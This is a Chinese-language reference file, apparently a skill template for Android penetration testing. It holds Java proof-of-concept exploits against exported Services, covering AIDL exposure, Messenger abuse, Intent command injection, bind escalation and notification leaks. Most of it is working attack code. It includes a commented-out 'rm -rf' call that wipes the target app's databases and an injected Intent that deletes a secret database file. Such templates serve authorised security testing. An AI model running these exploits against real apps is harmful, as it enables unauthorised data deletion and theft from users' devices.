---
name: poc-app-service
description: Service 组件攻击 PoC — 覆盖 AIDL 暴露、Messenger 滥用、Intent 注入、绑定提权、前台泄露 5 种漏洞类型
---

# Service 组件攻击 PoC

导出 Service 可被任意应用绑定或启动，攻击面包括 AIDL 接口暴露、Messenger 消息滥用、Intent 命令注入等。

## 漏洞类型索引

| 漏洞 | 等级 | PoC 类名 |
|------|------|---------|
| AIDL 接口暴露 | HIGH | `ServiceAidlExposeExploit` |
| Messenger 消息滥用 | MEDIUM | `ServiceMessengerAbuseExploit` |
| Intent 命令注入 | HIGH | `ServiceIntentInjectExploit` |
| 绑定提权 | HIGH | `ServiceBindEscalationExploit` |
| 前台服务泄露 | MEDIUM | `ServiceForegroundLeakExploit` |

## ServiceAidlExposeExploit

绑定导出 Service，通过 AIDL 接口调用敏感方法。

```java
public class ServiceAidlExposeExploit extends Exploit {
    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.VulnService");
        context.bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }

    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            log("Service connected");
            // 将 binder 转为 AIDL 接口（需反编译获取接口定义）
            // ITargetService service = ITargetService.Stub.asInterface(binder);
            // try {
            //     String result = service.getSensitiveData();
            //     log("Leaked data: " + result);
            //     service.executeCommand("rm -rf /data/data/com.target/databases");
            // } catch (RemoteException e) {
            //     log("AIDL call failed: " + e.getMessage());
            // }
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {}
    };
}
```

> 注意：需从 APK 反编译中提取 AIDL 接口定义（`.aidl` 文件或 `Stub` 类），在 PoC 项目中重建接口。

## ServiceMessengerAbuseExploit

绑定 Service，通过 Messenger 发送恶意消息触发敏感操作。

```java
public class ServiceMessengerAbuseExploit extends Exploit {
    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.MsgService");
        context.bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }

    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            Messenger messenger = new Messenger(binder);
            try {
                // 发送恶意消息，msg.what 和 msg.obj 需通过反编译确定
                Message msg = Message.obtain();
                msg.what = 1; // 按 Service 协议设置消息类型
                msg.obj = "malicious_command";
                messenger.send(msg);
                log("Message sent to service");
            } catch (Exception e) {
                log("Send failed: " + e.getMessage());
            }
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {}
    };
}
```

## ServiceIntentInjectExploit

通过 startService 传递恶意 Intent Extra，触发 IntentService 的危险操作。

```java
public class ServiceIntentInjectExploit extends Exploit {
    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.CommandService");
        intent.setAction("com.target.EXECUTE_COMMAND");
        intent.putExtra("command", "delete");
        intent.putExtra("target_path", "/data/data/com.target/databases/secret.db");
        context.startService(intent);
    }
}
```

## ServiceBindEscalationExploit

绑定导出 Service 获取高权限接口，执行未授权操作。

```java
public class ServiceBindEscalationExploit extends Exploit {
    @Override
    public void execute() {
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.PrivilegedService");
        context.bindService(intent, connection, Context.BIND_AUTO_CREATE);
    }

    private final ServiceConnection connection = new ServiceConnection() {
        @Override
        public void onServiceConnected(ComponentName name, IBinder binder) {
            log("Bound to privileged service");
            // 通过 Binder 接口调用特权方法
            // 需反编译确定接口定义和可用方法
            // 例如：grantPermission(packageName, permissionName)
        }
        @Override
        public void onServiceDisconnected(ComponentName name) {}
    };
}
```

## ServiceForegroundLeakExploit

读取前台服务通知中泄露的敏感信息。

```java
public class ServiceForegroundLeakExploit extends Exploit {
    @Override
    public void execute() {
        // 1. 启动目标前台服务
        Intent intent = new Intent();
        intent.setClassName("com.target", "com.target.LeakyForegroundService");
        context.startService(intent);

        // 2. 通过 NotificationListenerService 读取通知内容
        // 需在 PoC 中实现 NotificationListenerService
        // 或直接通过 shell 检查通知：
        log("Check notifications for sensitive data leaks");
        log("Common leak: tokens, passwords, personal info in notification text");
    }
}
```
